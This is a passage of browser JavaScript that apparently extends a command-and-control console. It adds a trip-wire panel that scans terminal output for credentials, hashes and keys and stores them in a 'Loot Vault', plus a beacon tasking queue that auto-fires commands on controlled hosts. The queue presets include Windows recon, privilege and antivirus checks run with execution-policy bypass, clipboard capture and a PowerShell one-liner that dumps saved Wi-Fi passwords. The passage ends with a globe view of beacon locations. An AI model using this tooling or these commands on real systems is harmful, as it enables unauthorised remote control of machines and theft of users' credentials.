                '<span class="wt-tw-status"><span class="wt-tw-dot wt-tw-dot-active"></span> WATCHING</span>' +
                '<div class="wt-tw-hbtns">' +
                    '<button class="wt-toolbar-btn" id="wtTwResetBtn">RESET</button>' +
                    '<button class="wt-toolbar-btn" id="wtTwClrBtn">CLR</button>' +
                    '<button class="wt-toolbar-btn" id="wtTwCloseBtn">&#x2715;</button>' +
                '</div>' +
            '</div>' +
            '<div class="wt-tw-body">' +
                '<div class="wt-tw-col wt-tw-col-rules">' +
                    '<div class="wt-tw-section-title">RULES <span id="wtTwRuleCount" class="wt-tw-count"></span></div>' +
                    '<div id="wtTwRulesWrap"></div>' +
                    '<div class="wt-tw-add-row">' +
                        '<input id="wtTwNewPattern" class="wt-tw-input" placeholder="keyword or /regex/flags" />' +
                        '<select id="wtTwNewTag" class="wt-tw-select">' +
                            '<option>CREDS</option><option>HASHES</option><option>KEYS</option>' +
                            '<option>PRIV</option><option>LOOT</option><option>CUSTOM</option>' +
                        '</select>' +
                        '<label class="wt-tw-loot-label" title="Auto-save to Loot Vault"><input type="checkbox" id="wtTwNewAutoLoot" checked /> VAULT</label>' +
                        '<button class="wt-toolbar-btn" id="wtTwAddBtn">+ ADD</button>' +
                    '</div>' +
                '</div>' +
                '<div class="wt-tw-col wt-tw-col-alerts">' +
                    '<div class="wt-tw-section-title">ALERTS <span id="wtTwAlertCount" class="wt-tw-count"></span></div>' +
                    '<div id="wtTwAlertsWrap" class="wt-tw-alerts-wrap"></div>' +
                '</div>' +
            '</div>';
        anchor.parentNode.insertBefore(panel, anchor.nextSibling);
        panel.querySelector('#wtTwCloseBtn').addEventListener('click', toggleTripWirePanel);
        panel.querySelector('#wtTwClrBtn').addEventListener('click', function() {
            if (!confirm('Clear all trip-wire alerts?')) return;
            wtTripWireAlerts = [];
            saveTripWireAlerts();
            updateTripWireBadge();
            renderTripWireAlerts();
        });
        panel.querySelector('#wtTwResetBtn').addEventListener('click', function() {
            if (!confirm('Reset to default rules? Custom rules will be lost.')) return;
            wtTripWireRules = WT_TW_DEFAULT_RULES.map(function(r){ return Object.assign({},r); });
            saveTripWireRules();
            renderTripWireRules();
        });
        panel.querySelector('#wtTwAddBtn').addEventListener('click', addTripWireRule);
        wtPatchInputs(panel);
        renderTripWireRules();
        renderTripWireAlerts();
    }

    function renderTripWireRules() {
        var wrap  = document.getElementById('wtTwRulesWrap');
        var count = document.getElementById('wtTwRuleCount');
        if (!wrap) return;
        var active = wtTripWireRules.filter(function(r){ return r.enabled; }).length;
        if (count) count.textContent = '(' + active + '/' + wtTripWireRules.length + ' active)';
        if (!wtTripWireRules.length) {
            wrap.innerHTML = '<div class="wt-tw-empty">No rules — add one below</div>';
            return;
        }
        var html = '<table class="wt-tw-table"><thead><tr>' +
            '<th>PATTERN</th><th>TAG</th><th>VAULT</th><th>ON</th><th></th>' +
            '</tr></thead><tbody>';
        wtTripWireRules.forEach(function(rule, idx) {
            var c = WT_TW_TAG_COLORS[rule.tag] || '#7a8a9a';
            html += '<tr class="wt-tw-rule-row' + (rule.enabled ? '' : ' wt-tw-rule-disabled') + '">' +
                '<td class="wt-tw-pattern-cell"><code class="wt-tw-code">' + wtEsc(rule.pattern) + '</code>' +
                    (rule.flag ? '<span class="wt-tw-flag">/' + wtEsc(rule.flag) + '</span>' : '') + '</td>' +
                '<td><span class="wt-tw-tag-badge" style="background:' + c + '22;border-color:' + c + ';color:' + c + '">' + wtEsc(rule.tag) + '</span></td>' +
                '<td class="wt-tw-center">' + (rule.autoLoot ? '<span style="color:#00ff41">✔</span>' : '<span style="color:#444">✖</span>') + '</td>' +
                '<td class="wt-tw-center"><label class="wt-tw-toggle">' +
                    '<input type="checkbox" class="wt-tw-toggle-cb" data-idx="' + idx + '" ' + (rule.enabled ? 'checked' : '') + ' />' +
                    '<span class="wt-tw-slider"></span></label></td>' +
                '<td>' + (!rule.builtin ? '<button class="wt-mini-btn wt-tw-del-btn" data-idx="' + idx + '">✕</button>' : '') + '</td>' +
            '</tr>';
        });
        html += '</tbody></table>';
        wrap.innerHTML = html;
        wrap.querySelectorAll('.wt-tw-toggle-cb').forEach(function(cb) {
            cb.addEventListener('change', function() {
                wtTripWireRules[parseInt(this.dataset.idx)].enabled = this.checked;
                saveTripWireRules();
                renderTripWireRules();
            });
        });
        wrap.querySelectorAll('.wt-tw-del-btn').forEach(function(btn) {
            btn.addEventListener('click', function() {
                wtTripWireRules.splice(parseInt(this.dataset.idx), 1);
                saveTripWireRules();
                renderTripWireRules();
            });
        });
    }

    function addTripWireRule() {
        var raw     = ((document.getElementById('wtTwNewPattern') || {}).value || '').trim();
        var tag     = (document.getElementById('wtTwNewTag')      || {}).value || 'CUSTOM';
        var autoLoot= !!((document.getElementById('wtTwNewAutoLoot') || {}).checked);
        if (!raw) return;
        var pattern = raw, flag = 'i';
        var m = raw.match(/^\/(.+)\/([gimsuy]*)$/);
        if (m) { pattern = m[1]; flag = m[2]; }
        try { new RegExp(pattern, flag || undefined); }
        catch(e) { alert('Invalid regex: ' + e.message); return; }
        wtTripWireRules.push({ id:'tw_u' + Date.now(), pattern:pattern, flag:flag, tag:tag, autoLoot:autoLoot, enabled:true, builtin:false });
        saveTripWireRules();
        document.getElementById('wtTwNewPattern').value = '';
        renderTripWireRules();
    }

    function renderTripWireAlerts() {
        var wrap  = document.getElementById('wtTwAlertsWrap');
        var count = document.getElementById('wtTwAlertCount');
        if (!wrap) return;
        if (count) count.textContent = '(' + wtTripWireAlerts.length + ')';
        if (!wtTripWireAlerts.length) {
            wrap.innerHTML = '<div class="wt-tw-empty">No alerts yet — watching terminal output\u2026</div>';
            return;
        }
        var html = '';
        wtTripWireAlerts.forEach(function(a, idx) {
            var c  = WT_TW_TAG_COLORS[a.tag] || '#7a8a9a';
            var ts = new Date(a.ts).toTimeString().slice(0,8);
            html += '<div class="wt-tw-alert-row">' +
                '<span class="wt-tw-alert-ts">' + wtEsc(ts) + '</span>' +
                '<span class="wt-tw-tag-badge" style="background:' + c + '22;border-color:' + c + ';color:' + c + '">' + wtEsc(a.tag) + '</span>' +
                (a.beaconId ? '<span class="wt-beacon-id-badge" style="font-size:9px">' + wtEsc(a.beaconId) + '</span>' : '') +
                '<code class="wt-tw-alert-line" title="' + wtEsc(a.line) + '">' + wtEsc(wtTrunc(a.line, 100)) + '</code>' +
                '<div class="wt-tw-alert-actions">' +
                    '<button class="wt-mini-btn wt-tw-copy-btn" data-idx="' + idx + '" title="Copy line">\u2398</button>' +
                    (!a.looted
                        ? '<button class="wt-mini-btn wt-tw-vault-btn" data-idx="' + idx + '" title="Save to Loot Vault">\u25b2</button>'
                        : '<span style="color:#00ff41;font-size:9px;padding:0 3px">VLTD</span>') +
                '</div>' +
            '</div>';
        });
        wrap.innerHTML = html;
        wrap.querySelectorAll('.wt-tw-copy-btn').forEach(function(btn) {
            btn.addEventListener('click', function() {
                var a = wtTripWireAlerts[parseInt(this.dataset.idx)];
                if (a) navigator.clipboard.writeText(a.line).catch(function(){});
            });
        });
        wrap.querySelectorAll('.wt-tw-vault-btn').forEach(function(btn) {
            btn.addEventListener('click', function() {
                var idx = parseInt(this.dataset.idx), a = wtTripWireAlerts[idx];
                if (!a) return;
                if (typeof addLootEntry === 'function') addLootEntry(a.line, a.tag, a.nodeId);
                a.looted = true;
                saveTripWireAlerts();
                renderTripWireAlerts();
            });
        });
    }

    function startTripWireWatcher() {
        if (wtTripWireInterval) clearInterval(wtTripWireInterval);
        wtTripWireLastLine = 0;
        wtTripWireInterval = setInterval(function() {
            try {
                if (typeof xterm === 'undefined' || !xterm || !xterm.buffer || !xterm.buffer.active) return;
                var buf   = xterm.buffer.active;
                var total = buf.length;
                if (total <= wtTripWireLastLine) return;
                for (var i = wtTripWireLastLine; i < total; i++) {
                    var lineObj = buf.getLine(i);
                    if (!lineObj) continue;
                    var lineStr = lineObj.translateToString(true).trim();
                    if (lineStr.length > 2) wtScanLine(lineStr);
                }
                wtTripWireLastLine = total;
            } catch(e) {}
        }, 800);
    }

    function wtScanLine(line) {
        for (var i = 0; i < wtTripWireRules.length; i++) {
            var rule = wtTripWireRules[i];
            if (!rule.enabled) continue;
            try {
                if (new RegExp(rule.pattern, rule.flag || undefined).test(line)) {
                    wtTripWireFire(rule, line);
                    break; // first matching rule wins per line
                }
            } catch(e) {}
        }
    }

    function wtTripWireFire(rule, line) {
        var nodeId = wtCurrentIntelNodeId || null;
        var node = null;
        if (nodeId && typeof nodes !== 'undefined') {
            for (var i = 0; i < nodes.length; i++) {
                if (nodes[i]._id === nodeId) { node = nodes[i]; break; }
            }
        }
        var beaconId   = node ? (node._id || '').split('/').pop().slice(-8).toUpperCase() : null;
        var beaconName = node ? (node.name || '') : '';
        var entry = {
            ts: Date.now(), tag: rule.tag, pattern: rule.pattern,
            line: line, nodeId: nodeId, beaconId: beaconId,
            beaconName: beaconName, ip: node ? (node.ip || '') : '',
            looted: false
        };
        if (rule.autoLoot && typeof addLootEntry === 'function') {
            addLootEntry(line, rule.tag, nodeId);
            entry.looted = true;
        }
        wtTripWireAlerts.unshift(entry);
        if (wtTripWireAlerts.length > 100) wtTripWireAlerts.pop();
        saveTripWireAlerts();
        wtLogEvent('ALERT', '[' + rule.tag + '] ' + wtTrunc(line, 60), nodeId);
        // Flash WIRE button red
        var btn = document.getElementById('wtTripWireBtn');
        if (btn) {
            btn.classList.add('wt-tw-flash');
            setTimeout(function(){ btn.classList.remove('wt-tw-flash'); }, 2500);
        }
        updateTripWireBadge();
        if (document.getElementById('wtTripWirePanel')) renderTripWireAlerts();
    }

    // ============================================================
    // SECTION 27: Beacon Tasking Queue
    // ============================================================
    var wtTaskStore = {};
    var WT_TASK_KEY = 'wt_taskq_v1';
    var WT_TASK_AUTOFIRE_KEY = 'wt_taskq_autofire';

    var WT_TASK_PRESETS = [
        { label: 'whoami /all',  cmd: 'whoami /all',                                                           cat: 'recon' },
        { label: 'systeminfo',   cmd: 'systeminfo',                                                             cat: 'recon' },
        { label: 'ipconfig',     cmd: 'ipconfig /all',                                                          cat: 'net'   },
        { label: 'netstat',      cmd: 'netstat -ano',                                                           cat: 'net'   },
        { label: 'arp -a',       cmd: 'arp -a',                                                                 cat: 'net'   },
        { label: 'route print',  cmd: 'route print',                                                            cat: 'net'   },
        { label: 'net shares',   cmd: 'net share',                                                              cat: 'net'   },
        { label: 'tasklist',     cmd: 'tasklist /v',                                                            cat: 'proc'  },
        { label: 'ps list',      cmd: 'powershell -ep bypass -c "Get-Process | ft Name,Id,CPU -Auto"',          cat: 'proc'  },
        { label: 'net users',    cmd: 'net user',                                                               cat: 'enum'  },
        { label: 'local admins', cmd: 'net localgroup administrators',                                          cat: 'enum'  },
        { label: 'schtasks',     cmd: 'schtasks /query /fo LIST /v 2>nul | findstr "Task Name Status Run As"', cat: 'enum'  },
        { label: 'services',     cmd: 'sc query type= all state= all',                                          cat: 'enum'  },
        { label: 'whoami /priv', cmd: 'whoami /priv',                                                           cat: 'priv'  },
        { label: 'AV check',     cmd: 'powershell -ep bypass -c "Get-MpComputerStatus | select AMRunningMode,RealTimeProtectionEnabled"', cat: 'priv' },
        { label: 'UAC level',    cmd: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin', cat: 'priv' },
        { label: 'env vars',     cmd: 'set',                                                                    cat: 'recon' },
        { label: 'dir %TEMP%',   cmd: 'dir %TEMP%',                                                             cat: 'files' },
        { label: 'clipboard',    cmd: 'powershell -ep bypass -c "Get-Clipboard"',                               cat: 'loot'  },
        { label: 'wifi creds',   cmd: 'powershell -ep bypass -c "netsh wlan show profiles | Select-String Profile | %{$p=($_ -split \':\')[1].Trim(); $k=netsh wlan show profile name=$p key=clear 2>$null; if($k -match \'Key Content\s+:\s+(.+)\'){\'[\'+$p+\'] \'+$Matches[1]}}"', cat: 'loot' },
    ];

    function loadTaskStore() {
        try { wtTaskStore = JSON.parse(localStorage.getItem(WT_TASK_KEY) || '{}'); } catch(e) { wtTaskStore = {}; }
    }

    function saveTaskStore() {
        try { localStorage.setItem(WT_TASK_KEY, JSON.stringify(wtTaskStore)); } catch(e) {}
    }

    function getTasksForNode(nodeId) {
        return (wtTaskStore[nodeId] || []);
    }

    function setTasksForNode(nodeId, tasks) {
        wtTaskStore[nodeId] = tasks;
        saveTaskStore();
    }

    function isAutoFireOn(nodeId) {
        if (!nodeId) return false;
        try {
            var af = JSON.parse(localStorage.getItem(WT_TASK_AUTOFIRE_KEY) || '{}');
            return af[nodeId] !== false; // default true
        } catch(e) { return true; }
    }

    function setAutoFire(nodeId, val) {
        if (!nodeId) return;
        try {
            var af = JSON.parse(localStorage.getItem(WT_TASK_AUTOFIRE_KEY) || '{}');
            af[nodeId] = val;
            localStorage.setItem(WT_TASK_AUTOFIRE_KEY, JSON.stringify(af));
        } catch(e) {}
    }

    function injectQueueButton() {
        var toolbar = getWtToolbar();
        if (!toolbar) { setTimeout(injectQueueButton, 800); return; }
        if (document.getElementById('wtQueueBtn')) return;
        var btn = document.createElement('button');
        btn.id = 'wtQueueBtn';
        btn.title = 'Beacon Tasking Queue — queue commands that auto-fire when terminal opens';
        btn.innerHTML = '&#9776; QUEUE <span class="wt-queue-badge" id="wtQueueBadge" style="display:none">0</span>';
        btn.onclick = toggleQueuePanel;
        toolbar.appendChild(btn);
        updateQueueBadge();
    }

    function updateQueueBadge() {
        var total = 0;
        Object.keys(wtTaskStore).forEach(function(nid) { total += (wtTaskStore[nid] || []).length; });
        var badge = document.getElementById('wtQueueBadge');
        if (badge) {
            if (total > 0) { badge.textContent = total; badge.style.display = ''; }
            else { badge.style.display = 'none'; }
        }
        var btn = document.getElementById('wtQueueBtn');
        if (btn) btn.style.color = total > 0 ? '#00d4ff' : '';
    }

    function toggleQueuePanel() {
        var existing = document.getElementById('wtQueuePanel');
        var btn = document.getElementById('wtQueueBtn');
        if (existing) {
            existing.remove();
            if (btn) { btn.style.backgroundColor = ''; }
            return;
        }
        buildQueuePanel();
        if (btn) { btn.style.backgroundColor = 'rgba(0,212,255,0.15)'; btn.style.color = '#00d4ff'; }
    }

    function buildQueuePanel() {
        var panel = document.createElement('div');
        panel.id = 'wtQueuePanel';
        panel.className = 'wt-queue-panel';

        var selectedNode = wtCurrentIntelNodeId || null;

        // Build beacon dropdown
        var beaconOpts = '<option value="">-- select beacon --</option>';
        if (typeof nodes !== 'undefined' && nodes) {
            nodes.forEach(function(n) {
                var qCount = getTasksForNode(n._id).length;
                var bid = getBeaconId(n._id);
                var sel = (n._id === selectedNode) ? ' selected' : '';
                beaconOpts += '<option value="' + wtEscapeHtml(n._id) + '"' + sel + '>' +
                    wtEscapeHtml(n.name || bid) +
                    (qCount > 0 ? ' [' + qCount + ']' : '') +
                    '</option>';
            });
        }

        var autoFireOn = isAutoFireOn(selectedNode);

        panel.innerHTML =
            '<div class="wt-queue-header">' +
                '<span class="wt-panel-label">&#9776; BEACON TASKING QUEUE</span>' +
                '<div style="display:flex;align-items:center;gap:8px;margin-left:auto">' +
                    '<label class="wt-queue-auto-label" title="Auto-fire queued tasks when terminal opens">' +
                        '<input type="checkbox" id="wtQueueAutoFire"' + (autoFireOn ? ' checked' : '') + '> AUTO-FIRE' +
                    '</label>' +
                    '<button class="wt-queue-fire-btn" id="wtQueueFireNow">&#9654; FIRE NOW</button>' +
                    '<button class="wt-queue-clr-btn" id="wtQueueClrBtn">CLR</button>' +
                    '<button class="wt-queue-close-btn" id="wtQueueClose">&#10005;</button>' +
                '</div>' +
            '</div>' +
            '<div class="wt-queue-body">' +
                '<div class="wt-queue-left">' +
                    '<div class="wt-queue-beacon-row">' +
                        '<span class="wt-queue-sublabel">TARGET BEACON</span>' +
                        '<select id="wtQueueNodeSel" class="wt-queue-sel">' + beaconOpts + '</select>' +
                    '</div>' +
                    '<div id="wtQueueTaskList" class="wt-queue-tasklist"></div>' +
                    '<div class="wt-queue-add-row">' +
                        '<input type="text" id="wtQueueCmdInput" class="wt-queue-cmd-input" placeholder="Command to queue..." />' +
                        '<input type="text" id="wtQueueLabelInput" class="wt-queue-label-input" placeholder="Label" />' +
                        '<input type="number" id="wtQueueDelayInput" class="wt-queue-delay-input" value="1500" min="0" max="30000" title="Delay (ms) before this command fires" />' +
                        '<button class="wt-queue-add-btn" id="wtQueueAddBtn">+ ADD</button>' +
                    '</div>' +
                '</div>' +
                '<div class="wt-queue-right">' +
                    '<div class="wt-queue-sublabel" style="margin-bottom:6px">QUICK-ADD PRESETS</div>' +
                    '<div class="wt-queue-preset-grid" id="wtQueuePresets"></div>' +
                '</div>' +
            '</div>';

        // Insert below toolbar
        var toolbar = document.getElementById('devListToolbarSpan');
        if (toolbar && toolbar.parentNode) {
            toolbar.parentNode.insertBefore(panel, toolbar.nextSibling);
        } else {
            (document.getElementById('p1') || document.body).appendChild(panel);
        }

        document.getElementById('wtQueueClose').onclick = toggleQueuePanel;

        var nodeSel = document.getElementById('wtQueueNodeSel');
        nodeSel.onchange = function() {
            selectedNode = this.value || null;
            renderQueueTaskList(selectedNode);
            document.getElementById('wtQueueAutoFire').checked = isAutoFireOn(selectedNode);
        };

        document.getElementById('wtQueueAutoFire').onchange = function() {
            setAutoFire(selectedNode, this.checked);
        };

        document.getElementById('wtQueueFireNow').onclick = function() {
            var nid = nodeSel.value || wtCurrentIntelNodeId;
            if (!nid) { alert('Select a beacon first'); return; }
            fireQueueForNode(nid);
        };

        document.getElementById('wtQueueClrBtn').onclick = function() {
            var nid = nodeSel.value || null;
            if (!nid) { alert('Select a beacon first'); return; }
            if (!confirm('Clear all queued tasks for this beacon?')) return;
            setTasksForNode(nid, []);
            renderQueueTaskList(nid);
            updateQueueBadge();
            // update option label
            var opt = nodeSel.querySelector('option[value="' + nid + '"]');
            if (opt) opt.textContent = opt.textContent.replace(/ \[\d+\]$/, '');
        };

        document.getElementById('wtQueueAddBtn').onclick = function() {
            var nid = nodeSel.value || null;
            if (!nid) { alert('Select a beacon first'); return; }
            var cmd = document.getElementById('wtQueueCmdInput').value.trim();
            if (!cmd) return;
            var label = document.getElementById('wtQueueLabelInput').value.trim();
            var delay = parseInt(document.getElementById('wtQueueDelayInput').value, 10);
            if (isNaN(delay) || delay < 0) delay = 1500;
            addQueueTask(nid, cmd, label || cmd.substring(0, 30), delay);
            document.getElementById('wtQueueCmdInput').value = '';
            document.getElementById('wtQueueLabelInput').value = '';
        };

        document.getElementById('wtQueueCmdInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') document.getElementById('wtQueueAddBtn').click();
        });

        renderQueuePresets();
        renderQueueTaskList(selectedNode);
        wtPatchInputs(panel);
    }

    function renderQueueTaskList(nodeId) {
        var container = document.getElementById('wtQueueTaskList');
        if (!container) return;
        var tasks = nodeId ? getTasksForNode(nodeId) : [];
        if (!tasks.length) {
            container.innerHTML = '<div class="wt-queue-empty">No tasks queued.' +
                (nodeId ? '' : ' Select a beacon above.') + '</div>';
            return;
        }
        container.innerHTML = tasks.map(function(t, idx) {
            var disabled = t.enabled === false;
            return '<div class="wt-queue-task-row' + (disabled ? ' wt-queue-task-disabled' : '') + '" data-id="' + wtEscapeHtml(t.id) + '">' +
                '<span class="wt-queue-task-num">' + (idx + 1) + '</span>' +
                '<div class="wt-queue-task-info">' +
                    '<span class="wt-queue-task-label">' + wtEscapeHtml(t.label || t.cmd.substring(0, 40)) + '</span>' +
                    '<span class="wt-queue-task-cmd">' + wtEscapeHtml(t.cmd.substring(0, 65)) + (t.cmd.length > 65 ? '…' : '') + '</span>' +
                    '<span class="wt-queue-task-delay">&#9201; ' + t.delay + 'ms</span>' +
                '</div>' +
                '<div class="wt-queue-task-actions">' +
                    '<button class="wt-mini-btn wt-q-up" data-idx="' + idx + '" title="Move up">&#8593;</button>' +
                    '<button class="wt-mini-btn wt-q-dn" data-idx="' + idx + '" title="Move down">&#8595;</button>' +
                    '<button class="wt-mini-btn wt-q-tog" data-idx="' + idx + '" title="' + (disabled ? 'Enable' : 'Disable') + '">' + (disabled ? 'ON' : 'OFF') + '</button>' +
                    '<button class="wt-mini-btn wt-q-del" data-idx="' + idx + '" title="Delete">&#10005;</button>' +
                '</div>' +
            '</div>';
        }).join('');

        container.querySelectorAll('.wt-q-up').forEach(function(btn) {
            btn.onclick = function() {
                var i = parseInt(this.dataset.idx, 10);
                var t = getTasksForNode(nodeId);
                if (i < 1) return;
                var tmp = t[i - 1]; t[i - 1] = t[i]; t[i] = tmp;
                setTasksForNode(nodeId, t); renderQueueTaskList(nodeId); updateQueueBadge();
            };
        });
        container.querySelectorAll('.wt-q-dn').forEach(function(btn) {
            btn.onclick = function() {
                var i = parseInt(this.dataset.idx, 10);
                var t = getTasksForNode(nodeId);
                if (i >= t.length - 1) return;
                var tmp = t[i + 1]; t[i + 1] = t[i]; t[i] = tmp;
                setTasksForNode(nodeId, t); renderQueueTaskList(nodeId); updateQueueBadge();
            };
        });
        container.querySelectorAll('.wt-q-tog').forEach(function(btn) {
            btn.onclick = function() {
                var i = parseInt(this.dataset.idx, 10);
                var t = getTasksForNode(nodeId);
                t[i].enabled = (t[i].enabled === false) ? true : false;
                setTasksForNode(nodeId, t); renderQueueTaskList(nodeId);
            };
        });
        container.querySelectorAll('.wt-q-del').forEach(function(btn) {
            btn.onclick = function() {
                var i = parseInt(this.dataset.idx, 10);
                var t = getTasksForNode(nodeId);
                t.splice(i, 1);
                setTasksForNode(nodeId, t); renderQueueTaskList(nodeId); updateQueueBadge();
                var nodeSel = document.getElementById('wtQueueNodeSel');
                if (nodeSel) {
                    var opt = nodeSel.querySelector('option[value="' + nodeId + '"]');
                    if (opt) {
                        var newCount = t.length;
                        opt.textContent = opt.textContent.replace(/ \[\d+\]$/, '') + (newCount > 0 ? ' [' + newCount + ']' : '');
                    }
                }
            };
        });
    }

    function renderQueuePresets() {
        var container = document.getElementById('wtQueuePresets');
        if (!container) return;
        container.innerHTML = WT_TASK_PRESETS.map(function(p) {
            var col = WT_CAT_COLORS[p.cat] || '#7a8a9a';
            return '<button class="wt-queue-preset-btn" style="border-left:2px solid ' + col + '" ' +
                   'data-cmd="' + wtEscapeHtml(p.cmd) + '" data-label="' + wtEscapeHtml(p.label) + '" ' +
                   'title="' + wtEscapeHtml(p.cmd) + '">' + wtEscapeHtml(p.label) + '</button>';
        }).join('');
        container.querySelectorAll('.wt-queue-preset-btn').forEach(function(btn) {
            btn.onclick = function() {
                var nodeSel = document.getElementById('wtQueueNodeSel');
                var nid = (nodeSel && nodeSel.value) ? nodeSel.value : wtCurrentIntelNodeId;
                if (!nid) { alert('Select a beacon first'); return; }
                var cmd = this.dataset.cmd, label = this.dataset.label;
                var delayEl = document.getElementById('wtQueueDelayInput');
                var delay = delayEl ? (parseInt(delayEl.value, 10) || 1500) : 1500;
                addQueueTask(nid, cmd, label, delay);
            };
        });
    }

    function addQueueTask(nodeId, cmd, label, delay) {
        if (!nodeId || !cmd) return;
        var tasks = getTasksForNode(nodeId);
        tasks.push({
            id: Date.now().toString(36) + Math.random().toString(36).slice(2, 5),
            cmd: cmd,
            label: label || cmd.substring(0, 30),
            delay: (delay !== undefined && delay >= 0) ? delay : 1500,
            enabled: true,
            added: Date.now()
        });
        setTasksForNode(nodeId, tasks);
        updateQueueBadge();
        // Re-render list if panel is open and this beacon is selected
        var nodeSel = document.getElementById('wtQueueNodeSel');
        if (nodeSel && nodeSel.value === nodeId) {
            renderQueueTaskList(nodeId);
            // Update option label count
            var opt = nodeSel.querySelector('option[value="' + nodeId + '"]');
            if (opt) opt.textContent = opt.textContent.replace(/ \[\d+\]$/, '') + ' [' + tasks.length + ']';
        }
        // Flash QUEUE button
        var btn = document.getElementById('wtQueueBtn');
        if (btn) {
            btn.style.color = '#00d4ff';
            var badge = document.getElementById('wtQueueBadge');
            if (badge) { badge.style.background = '#00ff41'; setTimeout(function() { badge.style.background = ''; }, 800); }
        }
    }

    function fireQueueForNode(nodeId) {
        if (!nodeId) return;
        var tasks = getTasksForNode(nodeId).filter(function(t) { return t.enabled !== false; });
        if (!tasks.length) {
            wtLogEvent('INFO', 'QUEUE: no enabled tasks for beacon', nodeId);
            return;
        }
        wtLogEvent('CMD', 'QUEUE firing ' + tasks.length + ' tasks on beacon', nodeId);
        var cumDelay = 800; // initial delay for terminal to be ready
        tasks.forEach(function(task) {
            cumDelay += (task.delay >= 0 ? task.delay : 1500);
            (function(t, d) {
                setTimeout(function() {
                    sendBeaconCmd(t.cmd);
                    wtLogEvent('CMD', '[QUEUE] ' + wtTrunc(t.label || t.cmd, 55), nodeId);
                    // Flash row green
                    var rows = document.querySelectorAll('#wtQueueTaskList .wt-queue-task-row');
                    rows.forEach(function(r) {
                        if (r.dataset.id === t.id) {
                            r.classList.add('wt-queue-task-fired');
                            setTimeout(function() { r.classList.remove('wt-queue-task-fired'); }, 1400);
                        }
                    });
                }, d);
            })(task, cumDelay);
        });
    }

    function hookTerminalForQueue() {
        var qWatcher = new MutationObserver(function() {
            var area12 = document.getElementById('p12');
            var area13 = document.getElementById('p13');
            var area = null;
            if (area12 && area12.style.display !== 'none') area = area12;
            else if (area13 && area13.style.display !== 'none') area = area13;

            if (area && !area._wtQueueFired) {
                area._wtQueueFired = true;
                setTimeout(function() {
                    var nid = wtCurrentIntelNodeId;
                    if (!nid) return;
                    if (!isAutoFireOn(nid)) return;
                    var tasks = getTasksForNode(nid).filter(function(t) { return t.enabled !== false; });
                    if (!tasks.length) return;
                    fireQueueForNode(nid);
                }, 600);
            }
            // Reset flag when hidden so next open fires again
            if (area12 && area12.style.display === 'none') area12._wtQueueFired = false;
            if (area13 && area13.style.display === 'none') area13._wtQueueFired = false;
        });
        qWatcher.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style'] });
    }

    function setupTaskQueue() {
        loadTaskStore();
        injectQueueButton();
        hookTerminalForQueue();
    }

    // ============================================================
    // SECTION 32: Toolbar Row Helpers
    // ============================================================

    function createWtToolbarRow() {
        if (document.getElementById('wtToolbarFlex')) return;
        var tbl = document.getElementById('devListToolbarSpan');
        if (!tbl) { setTimeout(createWtToolbarRow, 500); return; }
        var tr = document.createElement('tr');
        tr.id = 'wtToolbarRow';
        var td = document.createElement('td');
        td.colSpan = 99;
        td.id = 'wtToolbarCell';
        var flex = document.createElement('div');
        flex.id = 'wtToolbarFlex';
        td.appendChild(flex);
        tr.appendChild(td);
        var tbody = tbl.querySelector('tbody') || tbl;
        tbody.appendChild(tr);
    }

    function getWtToolbar() {
        return document.getElementById('wtToolbarFlex') || document.getElementById('devListToolbarSpan');
    }

    function addWtToolbarSeparators() {
        var flex = document.getElementById('wtToolbarFlex');
        if (!flex) return;
        // Group boundaries: after TOPO, after OPS, after PAYLOAD, after WIRE
        var groups = [
            ['wtListenerBtn', 'wtTopoBtn'],
            ['wtOpsBtn'],
            ['wtPayloadBtn', 'wtLootBtn', 'wtCredsBtn', 'wtTripWireBtn'],
            ['wtQueueBtn', 'wtGlobeBtn']
        ];
        // Remove existing separators
        flex.querySelectorAll('.wt-tb-sep').forEach(function(s) { s.remove(); });
        // Re-read children order and insert separators between groups
        var lastGroupEnd = null;
        var insertAfter = ['wtTopoBtn', 'wtOpsBtn', 'wtTripWireBtn'];
        flex.childNodes.forEach(function(node) {
            if (node.nodeType !== 1) return;
            if (insertAfter.indexOf(node.id) !== -1) {
                var sep = document.createElement('span');
                sep.className = 'wt-tb-sep';
                sep.setAttribute('aria-hidden', 'true');
                if (node.nextSibling) {
                    flex.insertBefore(sep, node.nextSibling);
                } else {
                    flex.appendChild(sep);
                }
            }
        });
    }

    // ============================================================
    // SECTION 31: 3D Tactical Globe
    // ============================================================

    var wtGlobeVisible = false;
    var wtGlobeInited = false;
    var wtGlobeRenderer = null;
    var wtGlobeScene = null;
    var wtGlobeCamera = null;
    var wtGlobeAnimFrame = null;
    var wtGlobeDragging = false;
    var wtGlobeDragStart = { x: 0, y: 0 };
    var wtGlobeRotStart = { x: 0, y: 0 };
    var wtGlobeRotation = { x: 0.3, y: 0 };
    var wtGlobePivot = null;
    var wtGlobeBeaconDots = {};
    var wtGeoCache = {};
    var wtServerPos = null;
    var wtGlobeEarthMat = null;
    var wtGlobeCloudMesh = null;
    var wtGlobeAutoSpin = true;
    var wtGlobeActiveBeams = [];

    function injectGlobeButton() {
        if (document.getElementById('wtGlobeBtn')) return;
        var toolbar = getWtToolbar();
        if (!toolbar) { setTimeout(injectGlobeButton, 800); return; }
        var btn = document.createElement('button');
        btn.id = 'wtGlobeBtn';
        btn.className = 'wt-toolbar-btn';
        btn.title = '3D Tactical Globe — live beacon locations + C2 beam animations';
        btn.innerHTML = '&#9670; GLOBE';
        btn.onclick = toggleGlobePanel;
        toolbar.appendChild(btn);
    }

    function toggleGlobePanel() {
        wtGlobeVisible = !wtGlobeVisible;
        var panel = document.getElementById('wtGlobePanel');
        var btn = document.getElementById('wtGlobeBtn');
        if (!panel) { buildGlobePanel(); return; }
        panel.style.display = wtGlobeVisible ? 'flex' : 'none';
        if (btn) btn.classList.toggle('wt-toolbar-btn-active', wtGlobeVisible);
        if (wtGlobeVisible) {
            if (!wtGlobeInited) initGlobe();
            else { wtGlobeAnimate(); geolocateBeacons(); }
        } else {
            if (wtGlobeAnimFrame) { cancelAnimationFrame(wtGlobeAnimFrame); wtGlobeAnimFrame = null; }
        }
    }

    function buildGlobePanel() {
        var anchor = document.getElementById('devListToolbarSpan');
        if (!anchor) return;
        var panel = document.createElement('div');
        panel.id = 'wtGlobePanel';
        panel.className = 'wt-globe-panel';
        panel.innerHTML =
            '<div id="wtGlobeLeft">' +
            '  <canvas id="wtGlobeCanvas"></canvas>' +
